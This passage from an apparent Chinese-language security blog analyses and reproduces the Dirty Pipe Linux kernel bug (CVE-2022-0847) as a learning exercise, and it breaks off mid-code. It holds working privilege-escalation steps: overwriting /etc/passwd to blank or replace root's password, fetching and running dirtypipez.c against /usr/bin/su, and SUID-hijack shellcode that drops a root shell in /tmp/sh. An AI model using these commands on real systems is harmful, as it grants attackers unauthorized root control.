class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br>        <span class="hljs-comment">///注意这里获取pipe_buffer的操作，也是被其他人遗漏掉的一点</span><br>        <span class="hljs-comment">//head - 1。因为head-1，才能得到前一个pipe_buf的page，进而完成续写。</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="hljs-number">1</span>) &amp; mask];<span class="hljs-comment">//获取 pipe 头部的缓冲区。</span><br><br><span class="hljs-keyword">int</span> offset = buf-&gt;offset + buf-&gt;len;<br>        <span class="hljs-comment">//[2]核心关键</span><br>        <span class="hljs-comment">//判断当前页面是否带有PIPE_BUF_FLAG_CAN_MERGE的flag，且前写入的数据拼接在之前的数据后面长度不超过一页(即写入操作不跨页)，如果都满足，则将 chars 长度的数据写入到当前的缓冲区中</span><br><span class="hljs-keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;<br>    offset + chars &lt;= PAGE_SIZE) &#123;<br>ret = <span class="hljs-built_in">pipe_buf_confirm</span>(pipe, buf);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">goto</span> out;<br><br>ret = <span class="hljs-built_in">copy_page_from_iter</span>(buf-&gt;page, offset, chars, from);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">unlikely</span>(ret &lt; chars)) &#123;<br>ret = -EFAULT;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><br>buf-&gt;len += ret;<br>            <span class="hljs-comment">//如果剩余要写入的数据大小为零，则直接返回。</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">iov_iter_count</span>(from))<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>&#125;<br>    <span class="hljs-comment">//[3]如果无法在上一页续写，则另起一页</span><br><span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-comment">//判断 pipe 的读者数量是否为零。</span><br><span class="hljs-keyword">if</span> (!pipe-&gt;readers) &#123;<br><span class="hljs-built_in">send_sig</span>(SIGPIPE, current, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!ret)<br>ret = -EPIPE;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>head = pipe-&gt;head;<br>        <span class="hljs-comment">//pipe缓冲区未满</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">pipe_full</span>(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;<br>            <span class="hljs-comment">// 获取pipe的缓冲区及pipe的临时页tmp_page，后续用于pipe_buf的初始化</span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> pipe-&gt;tmp_page;<br><span class="hljs-keyword">int</span> copied;<br>            <span class="hljs-comment">//[4]判断该tem_page是否已经分配，如果没有则alloc_page申请一个新的page</span><br><span class="hljs-keyword">if</span> (!page) &#123;<br>page = <span class="hljs-built_in">alloc_page</span>(GFP_HIGHUSER | __GFP_ACCOUNT);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">unlikely</span>(!page)) &#123;<br>ret = ret ? : -ENOMEM;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>pipe-&gt;tmp_page = page;<br>&#125;<br><br>            <span class="hljs-comment">//使用自旋锁锁住pipe的读者等待队列。再次检测pipe是否被填满，是则终止当前循环，执行下一次循环。</span><br><span class="hljs-built_in">spin_lock_irq</span>(&amp;pipe-&gt;rd_wait.lock);<br><br>head = pipe-&gt;head;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">pipe_full</span>(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;<br><span class="hljs-built_in">spin_unlock_irq</span>(&amp;pipe-&gt;rd_wait.lock);<br><span class="hljs-keyword">continue</span>;<br>&#125;<br>      <span class="hljs-comment">//将struct pipe_inode_info实例的head字段值增加1。并释放自旋锁。</span><br>pipe-&gt;head = head + <span class="hljs-number">1</span>;<br><span class="hljs-built_in">spin_unlock_irq</span>(&amp;pipe-&gt;rd_wait.lock);<br><br>      <span class="hljs-comment">//[5]将新的页放在数组最前面(可能会替换掉原有页面)，初始化页管理结构的相关成员。</span><br>buf = &amp;pipe-&gt;bufs[head &amp; mask];<br>buf-&gt;page = page;<br>buf-&gt;ops = &amp;anon_pipe_buf_ops;<br>buf-&gt;offset = <span class="hljs-number">0</span>;<br>buf-&gt;len = <span class="hljs-number">0</span>;<br>            <br>       <span class="hljs-comment">//如果创建pipe时指定了O_DIRECT选项，则将缓冲区的flags字段设置为PIPE_BUF_FLAG_PACKET，否则设置为PIPE_BUF_FLAG_CAN_MERGE。</span><br>       <span class="hljs-comment">//文件操作O_DIRECT使用：https://www.jianshu.com/p/7c891a002a4e</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">is_packetized</span>(filp))<br>buf-&gt;flags = PIPE_BUF_FLAG_PACKET;<br><span class="hljs-keyword">else</span><br>buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;<br>pipe-&gt;tmp_page = <span class="hljs-literal">NULL</span>;<br>      <span class="hljs-comment">//将数据拷贝到新分配的page中</span><br>copied = <span class="hljs-built_in">copy_page_from_iter</span>(page, <span class="hljs-number">0</span>, PAGE_SIZE, from);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">unlikely</span>(copied &lt; PAGE_SIZE &amp;&amp; <span class="hljs-built_in">iov_iter_count</span>(from))) &#123;<br><span class="hljs-keyword">if</span> (!ret)<br>ret = -EFAULT;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>      <span class="hljs-comment">//设置相应的偏移量字段。</span><br>ret += copied;<br>buf-&gt;offset = <span class="hljs-number">0</span>;<br>buf-&gt;len = copied;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">iov_iter_count</span>(from))<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>…… ……<br>&#125;<br><br><span class="hljs-comment">//[https://github.com/torvalds/linux/blob/v5.8/fs/pipe.c#L403](https://github.com/torvalds/linux/blob/v5.8/fs/pipe.c#L403)</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">int</span> <span class="hljs-title">is_packetized</span><span class="hljs-params">(struct file *file)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> (file-&gt;f_flags &amp; O_DIRECT) != <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//https://github.com/torvalds/linux/blob/1c52283265a462a100ae63ddf58b4e5884acde86/include/linux/pipe_fs_i.h#L132</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">pipe_empty</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> head, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> tail)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> head == tail;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="POC视角：splice-和write"><a href="#POC视角：splice-和write" class="headerlink" title="POC视角：splice()和write()"></a>POC视角：splice()和write()</h2><p>作者早期概念性POC：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span> </span>&#123;<br>  <span class="hljs-keyword">for</span> (;;) <span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;AAAAA&quot;</span>, <span class="hljs-number">5</span>);<br>&#125;<br><span class="hljs-comment">// ./writer &gt;foo</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span> </span>&#123;<br>  <span class="hljs-keyword">for</span> (;;) &#123;<br>    <span class="hljs-built_in">splice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;BBBBB&quot;</span>, <span class="hljs-number">5</span>);<br>  &#125;<br>&#125;<br><span class="hljs-comment">// ./splicer &lt;foo |cat &gt;/dev/null</span><br></code></pre></td></tr></table></figure><p>仅使用了<code>splice()</code>和<code>write()</code> 函数，那么为什么仅需要这两个函数就可以达成效果？</p><ol><li><code>splice()</code>利用底层的零拷贝机制，调用<code>copy_page_to_iter_pipe()</code>完成pipe_buf的页和目标文件page_cache的绑定，且在<code>copy_page_to_iter_pipe()</code>中未初始化页面的<code>PIPE_BUF_FLAG_CAN_MERGE</code>属性</li><li><code>write()</code> 写入脏数据的时候调用<code>pipe_write()</code>，<code>pipe_write()</code>对带<code>PIPE_BUF_FLAG_CAN_MERGE</code>标签的<code>pipe_buf</code>写时，错误的判定write操作可合并(merge)，进而获取指向待写入文件界面缓存的pipe_buf的指针，且这里向管道写时不存在权限检查，最后导致了非法数据写入文件页面缓存, 实现了任意文件覆盖漏洞。<ol><li>如果没有<code>PIPE_BUF_FLAG_CAN_MERGE</code>标签的话，实际上会往<code>pipe-&gt;tmp_page</code>去写，此时就不会写到目标文件中。</li></ol></li></ol><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%2019.png"></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="docker安装（失败）"><a href="#docker安装（失败）" class="headerlink" title="docker安装（失败）"></a>docker安装（失败）</h3><ol><li>拉取镜像：docker pull ubuntu</li><li>启动容器：docker run -it  ubuntu /bin/bash。此为ubuntu20.04版本，内核Linux 3.10.0</li><li>安装基本命令：<ol><li>由于docker pul下来的为极简版的ubuntu，很多命令都没有，包括vi等</li><li>如果直接apt-get update的话，源不对，则很慢，于是考虑换源</li><li>在vi等命令没有的情况下，可以使用<strong>cat &gt;xxx.file &lt;EOF</strong>的操作换源，源地址：<a href="https://zhuanlan.zhihu.com/p/142014944">Ubuntu20.04软件源更换</a><br> <img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%208.png">      </li><li>换源后执行：apt-get update</li><li>安装基本命令：git，python3，python3-pip</li></ol></li><li>使用metarget搭建漏洞环境<ol><li>git clone <a href="https://github.com/brant-ruan/metarget.git">https://github.com/brant-ruan/metarget.git</a></li><li>cd metarget/</li><li>pip install -r requirements.txt</li><li>./metarget cnv install cve-2022-0847 –verbose<ol><li>报错six模块缺失：pip3 install six</li><li>报错<a href="https://www.codegrepper.com/code-examples/shell/%2Fusr%2Fbin%2Fadd-apt-repository%3A+No+such+file+or+directory">“/usr/bin/add-apt-repository: No such file or directory” **</a>：**apt-get install software-properties-common ，选6·Asia，和70·shanghai</li></ol></li><li>但是怎么解决报错，最终都安装环境失败</li></ol></li><li>原因：<a href="https://stackoverflow.com/questions/66413051/docker-linux-container-kernel-update">docker和宿主机共用同一个系统内核</a>（是我蠢了忘了这茬）<blockquote><p>You cannot upgrade kernel <em>inside docker container</em>- the whole point of using Docker containers in contrary to virtualization is that you use the same kernel that your underlying OS does. You have to upgrade your operating system kernel to fix this problem.</p></blockquote></li></ol><h3 id="虚拟机安装"><a href="#虚拟机安装" class="headerlink" title="虚拟机安装"></a>虚拟机安装</h3><ol><li>ubuntu18.04安装—失败<ol><li>使用metarget搭建漏洞环境，重启之后出现”SMBus Host Controller not enabled”无法开机，尝试多种方案，但无果，放弃<ol><li>虽然可以使用tty2进入命令行执行命令，但是不能复制粘贴，手敲命令很烦+觉得不是完美换内核方案，就算了</li></ol></li><li>手动升级内核：内核升级教程参考：<a href="https://zhuanlan.zhihu.com/p/75669680">记一次Ubuntu 18.04 内核升级 - 知乎 (zhihu.com)</a>。 但依然出现了上述错误，即使更换了另外一个内核版本依然出现上述问题，无果，放弃</li></ol></li><li>kali上安装—成功<ol><li>使用metarget搭建漏洞环境，重启之后出现”SMBus Host Controller not enabled”，但是并没有在这里卡主，等一会即可登录，成功！</li></ol></li></ol><h2 id="作者POC的原理"><a href="#作者POC的原理" class="headerlink" title="作者POC的原理"></a>作者POC的原理</h2><ol><li>首先创建一个 pipe。接着每次向 pipe 中写入一个页帧大小的数据。理由：从 <code>pipe_write()</code> 可知，每次写入都不会进入 <code>if (chars &amp;&amp; !was_empty)</code> 这个分支，因为写入数据的大小为页帧大小的整数倍时，<code>chars</code> 的值总为零。创建 pipe 的时候没有指定 <code>O_DIRECT</code> 标志，因此在 for 循环中会将每个 <code>pipe_buffer</code> 的标志位设置为 <code>PIPE_BUF_FLAG_CAN_MERGE</code>。</li><li>接下来打开要覆写的文件，并通过 <code>splice()</code> 系统调用向 pipe 中写入一个字节。根据 <code>splice()</code> 的实现，将待覆盖的文件从硬盘读取到 <code>page cache</code> 后，会把文件对应的<code>page cache</code>与 <code>pipe_buffer</code> 的 <code>page</code> 字段关联起来，并且不会重置 <code>pipe_buffer</code> 的 <code>flags</code> 字段。也就是说，此时 <code>flags</code> 字段的值仍为 <code>PIPE_BUF_FLAG_CAN_MERGE</code>。</li><li>最后<code>write()</code>调用 <code>pipe_write()</code> 之后<ol><li>由于写入小于一个页帧大小的数据，会进入 <code>if (chars &amp;&amp; !was_empty)</code> 分支。为了将小于一个页帧的数据写入到前一个 <code>pipe_buffer</code> 中， 此分支获取 <code>pipe_buffer</code> 的时候将 <code>head</code> 值减 1，从而此时 <code>pipe_buffer</code> 的指针指向的是待写入文件的 page cache。</li><li>再由于该<code>pipe_buffer</code> 设置了<code>PIPE_BUF_FLAG_CAN_MERGE</code>标志，会进入<code>if ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;offset + chars &lt;= PAGE_SIZE)</code>分支，进而调用<code>copy_page_to_iter_pipe()</code> 完成脏数据写入</li></ol></li></ol><h2 id="使用作者的POC改-etc-passwd"><a href="#使用作者的POC改-etc-passwd" class="headerlink" title="使用作者的POC改/etc/passwd"></a>使用作者的POC改/etc/passwd</h2><h3 id="etc-passwd概念"><a href="#etc-passwd概念" class="headerlink" title="/etc/passwd概念"></a>/etc/passwd概念</h3><ol><li>背景：历史上Linux的前身，一些基于Unix的系统，是没有shadow这个文件的，用户密码的哈希就保存在/etc/passwd的第二个字段。但是/etc/passwd是全局可读的文件，用户的哈希可能被其他用户所读取。</li><li>解决方案：衍生出了/etc/shadow文件。在此之后/etc/passwd的第二列通常设置为x，表示用户密码保存在/etc/shadow中，而/etc/shadow文件只有root用户可以读取和写入，这样就保护了密码哈希不能被第三方爆破。</li><li>关于passwd文件各个字段的<a href="https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/">解释</a><br> <img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%209.png"><ol><li><strong>Username用户名</strong>: 当用户登录时使用。它的长度应该在1到32个字符之间。</li><li><strong>Password</strong>:密码 x字符表示加密密码存储在/etc/shadow文件中。请注意，您需要使用passwd命令来计算在CLI中键入的密码的哈希值，或者在/etc/shadow文件中存储/更新密码的哈希值。为空则表示无密码</li><li><strong>User ID (UID)用户标识号</strong>: 必须为每个用户分配一个用户ID（UID）。0为root用户保留，UID1-99为其他预定义帐户保留。系统为管理和系统帐户/组保留了更多UID 100-999。</li><li><strong>Group ID (GID)组标识</strong>: 主组ID（存储在/etc/group文件中）</li><li><strong>User ID Info (GECOS)注释字段</strong>: 它允许添加有关用户的额外信息，例如用户的全名、电话号码等。此字段由finger命令使用。<ol><li>也就说这部分的字段可以任意删减无所谓</li></ol></li><li><strong>Home directory用户主目录</strong>: 用户登录时所处目录的绝对路径。如果此目录不存在，则用户目录变为/</li><li><strong>Command/shell命令解释程序</strong>: 命令或shell的绝对路径。通常是一个shell。但他也不一定是shell。例如，系统管理员可以使用nologin shell充当用户帐户的shell。此时如果shell设置为/sbin/nologin，并且用户试图直接登录Linux系统，/sbin/nologin shell将关闭登录连接。<ol><li>感觉本质上就是登录后首先执行的一段程序？比如nologin执行之后，则不返回shell，而是报错显示连接不上</li></ol></li></ol></li></ol><h3 id="方法一：P牛的手动"><a href="#方法一：P牛的手动" class="headerlink" title="方法一：P牛的手动"></a>方法一：P牛的手动</h3><p>代码：<code>./exp /etc/passwd 1 &quot;oot::0:0:rootx&quot;</code></p><p>原理：设置root的密码为空</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%2010.png"></p><h3 id="方法二：写个脚本自动化替换上述过程"><a href="#方法二：写个脚本自动化替换上述过程" class="headerlink" title="方法二：写个脚本自动化替换上述过程"></a>方法二：写个脚本自动化替换上述过程</h3><ol><li>解决方案：<a href="https://github.com/imfiver">imfiver</a>/<strong><a href="https://github.com/imfiver/CVE-2022-0847">CVE-2022-0847</a></strong></li><li>原理：把上述gcc编译以及手动执行过程全部写死了。</li><li>核心code<ol><li><code>passwd_tmp=$(cat /etc/passwd|head)</code> ：head默认值展示前10行。此时<code>passwd_tmp</code>变量为passwd文件中前10行的值</li><li><code>$&#123;passwd_tmp/root:x/oot:&#125;</code>：其语法规则为<code>$&#123;变量/查找/替换值&#125;</code>  。即替换<code>passwd_tmp</code>中的<code>root:x</code>为<code>oot:</code> （<code>splice</code>调用时默认已经读了passwd里面第一个字符<code>r</code>） <img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%2011.png"></li></ol> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp">cp /etc/passwd /tmp/passwd <span class="hljs-comment">//备份passwd文件</span><br>gcc exp.c -o exp -std=c99  <span class="hljs-comment">//编译exp</span><br>passwd_tmp=$(cat /etc/passwd|head)<br>./exp /etc/passwd <span class="hljs-number">1</span> <span class="hljs-string">&quot;$&#123;passwd_tmp/root:x/oot:&#125;&quot;</span>  <span class="hljs-comment">//执行exp</span><br></code></pre></td></tr></table></figure></li><li>复现： <img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%2012.png"></li><li>缺点：其使用的替换passwd文件的方法并不完美<ol><li>描述：<code>root:x</code> 为六个字符，而<code>oot:</code> 为4个，即使加上<code>splice</code>所读取的<code>r</code> 。替换后依然少了一个字符</li><li>现象：覆盖不完整，后续存在某个地方多一个字符。如图，其中news这个用户刚刚好是第十行，然后其shell地址就多了一个n。</li><li>后果：此时news用户登陆不上(虽然也没什么用)</li></ol></li><li>改进：使用P牛的方法，利用User ID Info (GECOS)注释字段，将注释字段的root改成rootx即可确保字符长度一致性，不会对后续内容进行影响<ol><li>可以看到前面P牛方法的图中diff内容，内容更加简洁有效。</li></ol></li></ol><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%2013.png"></p><h3 id="方法三：改root密码"><a href="#方法三：改root密码" class="headerlink" title="方法三：改root密码"></a>方法三：改root密码</h3><ol><li>背景：之前的方案都是将密码去除，那么能否改密码呢？</li><li>解决方案：<a href="https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit">Arinerron/CVE-2022-0847-DirtyPipe-Exploit</a> ，在passwd字段替换的内容改为相应的密码hash</li><li>技术背景：<ol><li>加密的密码具有固定格式：<code>$id$salt$encrypted</code> ：id表示加密算法，1代表<code>MD5</code>，5代表<code>SHA-256</code>，6代表<code>SHA-512</code> salt表示密码学中的Salt,系统随机生成 encrypted表示密码的hash。</li><li>生成加密密码的方法：<code>openssl passwd -1 -salt nosalt corp0ra1</code>.其中salt参数未指定则随机生成一个salt</li></ol></li><li>改进方向<ol><li>其使用的是<code>/bin/sh</code>作为shell解释程序，其实也可以改为<code>/bin/bash</code>这种（emm）</li><li>改为自己的密码hash，如：<code>openssl passwd -1  corp0ra1</code> ，产生秘钥为<code>$1$ZpSBXa3N$LGLE2TKYoc2GVFFP3.jC80</code></li></ol></li><li>疑问：/etc/passwd文件的第二行就乱了啊，这种乱的东西系统读的时候不会产生bug吗？？<ol><li>搜了半天，暂时没搜到相关资料。</li><li>但是既不影响root的登录，也不影响后续账户的登录，留个坑吧</li></ol></li></ol><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%2014.png"></p><h2 id="dirtypipez-c"><a href="#dirtypipez-c" class="headerlink" title="dirtypipez.c"></a><a href="https://haxx.in/files/dirtypipez.c">dirtypipez.c</a></h2><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp">mkdir dirtypipez<br>cd dirtypipez<br>wget https:<span class="hljs-comment">//haxx.in/files/dirtypipez.c</span><br>gcc dirtypipez.c -o dirtypipez<br><span class="hljs-comment">//先找到一个具有 SUID 权限的可执行文件</span><br>find / -perm -u=s -type f <span class="hljs-number">2</span>&gt;/dev/null<br><span class="hljs-comment">//执行其中任意一个具有 SUID 权限的文件，如/bin/su</span><br>./dirtypipez /usr/bin/su<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%2015.png"></p><h3 id="原理探索"><a href="#原理探索" class="headerlink" title="原理探索"></a>原理探索</h3><blockquote><p>此次接触这类提权方式，故深入探索</p></blockquote><p>操作：直接修改一个具有suid权限的可执行文件，然后执行这个可执行文件提权，完成提权后再把文件改回来</p><ol><li>hijacking suid binary：将恶意代码写入具备root权限的SUID程序</li><li>dropping suid shell：执行被篡改后的程序<ol><li>运行此程序时可获取root 权限:以root的身份将提权代码写入/tmp/sh，并设置其可执行权限为<code>4755</code> <img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%2016.png"></li></ol> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><br>fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/tmp/sh&quot;</span>, O_WRONLY | O_CREAT | O_TRUNC);<br><span class="hljs-built_in">write</span>(fd, elfcode, elfcode_len)<br><span class="hljs-built_in">chmod</span>(<span class="hljs-string">&quot;/tmp/sh&quot;</span>, <span class="hljs-number">04755</span>)<br><span class="hljs-built_in">close</span>(fd);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure></li><li>restoring suid binary：恢复被篡改文件为原样</li><li>popping root shell ：获取shell<ol><li>执行/tmp/sh文件 ，具有<code>4755</code>权限的/tmp/sh执行效果可参考：<a href="https://blog.csdn.net/Shad0wpf/article/details/103488853">Linux下普通用户使用强制位获取root权限</a></li></ol> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp">/tmp/sh文件内容：<br><span class="hljs-built_in">setuid</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">setgid</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">execve</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>, [<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-literal">NULL</span>], [<span class="hljs-literal">NULL</span>]);<br></code></pre></td></tr></table></figure></li></ol><p>补充：</p><ol><li>为什么要找具备root权限的SUID程序：SUID可以让程序调用者以文件拥有者的身份运行该文件，当我们以一个普通用户去运行一个root用户所有的SUID文件，那么运行该文件我们就可以获取到root权限，虽然SUID权限只在该程序执行过程中有效。</li><li>如何寻找具备root权限的SUID程序：如<code>find / -perm -u=s -type f 2&gt;/dev/null</code>(不同系统适用于不同的命令)</li></ol><h3 id="shellcode探索"><a href="#shellcode探索" class="headerlink" title="shellcode探索"></a>shellcode探索</h3><blockquote><p>其实作者备注给了shellcode，但是之前一直只是用别人的shellcode，或者自动化生成shellcode，其实并不能看懂shellcode，以及背后hex编码的含义，借此机会初步探一探而已。本质上是废话内容</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%2017.png"></p><h1 id="补充内容"><a href="#补充内容" class="headerlink" title="补充内容"></a>补充内容</h1><h2 id="作者文章提及的POC限制"><a href="#作者文章提及的POC限制" class="headerlink" title="作者文章提及的POC限制"></a>作者文章提及的POC限制</h2><ol><li>为什么要读的权限？因为要调用<code>splice()</code>，而<code>splice()</code>需要读的权限</li><li>为什么必须读一个字节？因为要使用<code>splice()</code>读入一个byte到pipe中 ，进而完成文件对应的 page与 <code>pipe_buffer</code> 的 <code>page</code> 字段的关联</li><li>为什么写的空间不能超过page限制？因为有判断<code>offset + chars &lt;= PAGE_SIZE</code>，超过则不让续写，会往<code>pipe-&gt;tmp_page</code>去写，就不会写到目标文件中。</li><li>为什么文件不能被改写大小？<ol><li>作者的解释：因为管道有自己的页面填充管理，不会告诉页面缓存追加了多少数据</li><li>我的理解：文件有自己的一套管理系统，记录自己的文件大小。而此处只是对缓存界面中改写</li><li>ghost461@知道创宇404实验室<strong>：*①</strong>做的实验提及：poc_p2写入的是tmpFile文件的页面缓存, 所以无限的循环会因文件到尾而写入失败, 跳出循环。②由于需要写入的页面都是内核通过文件IO读取的page cache, 所以任意写入文件只能是单纯的“覆写”, 不能调整文件的大小*</li></ol></li></ol><h2 id="作者POC的一些问题"><a href="#作者POC的一些问题" class="headerlink" title="作者POC的一些问题"></a>作者POC的一些问题</h2><ol><li>作者的POC为什么要写完所有的buffer？<ol><li>写完的目的是确保每个pipe的flag都设置了，确保splice绑定的pipe_buf的flag都设置了，不然存在一定的偶然性，即flag没设置好，进而导致后续续写失败</li></ol></li><li>作者POC为什么写一个页帧的大小？从 <code>pipe_write()</code> 函数可知，如果写入数据的大小为页帧大小的整数倍时，<code>chars</code> 的值总为零，此时写入不会进入 <code>if (chars &amp;&amp; !was_empty)</code> 这个分支。同时创建 pipe 的时候没有指定 <code>O_DIRECT</code> 标志，因此在 for 循环中会将每个 <code>pipe_buffer</code> 的标志位设置为 <code>PIPE_BUF_FLAG_CAN_MERGE</code>。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* fill the pipe completely; each pipe_buffer will now have  the PIPE_BUF_FLAG_CAN_MERGE flag */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">unsigned</span> r = pipe_size; r &gt; <span class="hljs-number">0</span>;) &#123;<br><span class="hljs-keyword">unsigned</span> n = r &gt; <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buffer) ? <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buffer) : r;<br><span class="hljs-built_in">write</span>(p[<span class="hljs-number">1</span>], buffer, n);<br>r -= n;<br>&#125;<br></code></pre></td></tr></table></figure></li><li>为什么作者POC要排干所有的pipe_buffer？<ol><li>能不能不排空？不行，因为进行merge之前有个判断if (chars &amp;&amp; !was_empty) ，而was_empty = pipe_empty(head, pipe-&gt;tail);，如果pipe满的话，则无法merge</li><li>能不能只排空一个？不行。因为之前<code>splice</code>函数调用<code>copy_page_to_iter_pipe</code>函数读入一个字节之后就占用了一个pipe_buffer，此时还是pipe_buffer满的。</li><li>能不能只排空两个？理论上应该可以？emmm没有深究了<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 